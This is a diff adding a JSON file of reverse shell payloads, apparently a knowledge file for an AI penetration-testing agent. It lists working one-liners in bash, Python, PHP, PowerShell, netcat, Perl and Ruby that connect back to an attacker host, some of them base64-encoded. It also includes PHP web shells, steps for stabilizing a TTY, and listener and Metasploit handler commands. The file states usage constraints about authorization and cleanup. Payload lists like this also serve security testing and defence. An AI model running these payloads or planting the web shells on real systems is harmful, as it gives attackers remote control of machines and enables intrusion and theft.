@@ -1,0 +1,54 @@
+{
+  "type": "reverse_shells",
+  "description": "Reverse shell payloads for post-exploitation. Agent-internal knowledge only — used for authorized engagements after initial exploitation.",
+  "usage_constraints": [
+    "ONLY use when explicit authorization has been confirmed via auth_gate",
+    "ONLY use for demonstrating RCE impact — never for persistent backdoors",
+    "ALWAYS notify client before executing in production environments",
+    "ALWAYS clean up: remove uploaded files, kill spawned shells after documentation"
+  ],
+  "bash": {
+    "standard":        "bash -i >& /dev/tcp/LHOST/LPORT 0>&1",
+    "background":      "bash -c 'bash -i >& /dev/tcp/LHOST/LPORT 0>&1' &",
+    "encoded":         "echo 'YmFzaCAtaSA+JiAvZGV2L3RjcC9MSE9TVC9MUE9SVCAwPiYx' | base64 -d | bash"
+  },
+  "python3": {
+    "socket":          "python3 -c \"import socket,os,pty;s=socket.socket();s.connect(('LHOST',LPORT));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn('/bin/bash')\""
+  },
+  "python2": {
+    "socket":          "python -c \"import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('LHOST',LPORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);\""
+  },
+  "php": {
+    "exec":            "php -r '$sock=fsockopen(\"LHOST\",LPORT);exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
+    "webshell_simple": "<?php system($_GET['cmd']); ?>",
+    "webshell_full":   "<?php if(isset($_REQUEST['cmd'])){ echo '<pre>'; $cmd = ($_REQUEST['cmd']); system($cmd); echo '</pre>'; die; } ?>"
+  },
+  "powershell": {
+    "base64":          "powershell -nop -noni -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIATABIAE8AUwBUACIALABMAFAATwBSAFQAKQA7",
+    "oneliner":        "$client = New-Object System.Net.Sockets.TCPClient('LHOST',LPORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+  },
+  "nc": {
+    "traditional":     "nc -e /bin/sh LHOST LPORT",
+    "no_e_flag":       "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc LHOST LPORT >/tmp/f"
+  },
+  "perl": {
+    "socket":          "perl -e 'use Socket;$i=\"LHOST\";$p=LPORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"
+  },
+  "ruby": {
+    "socket":          "ruby -rsocket -e'f=TCPSocket.open(\"LHOST\",LPORT).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"
+  },
+  "stabilization": {
+    "description": "Commands to stabilize a raw shell into a full TTY after catching reverse shell",
+    "step1":  "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'",
+    "step2":  "Ctrl+Z (background the shell)",
+    "step3":  "stty raw -echo; fg",
+    "step4":  "export TERM=xterm",
+    "windows": "rlwrap nc -lvnp LPORT"
+  },
+  "listener_setup": {
+    "nc":      "nc -lvnp LPORT",
+    "rlwrap":  "rlwrap nc -lvnp LPORT",
+    "pwncat":  "pwncat-cs -lp LPORT",
+    "metasploit": "use exploit/multi/handler; set payload linux/x64/shell_reverse_tcp; set LHOST LHOST; set LPORT LPORT; run"
+  }
+}
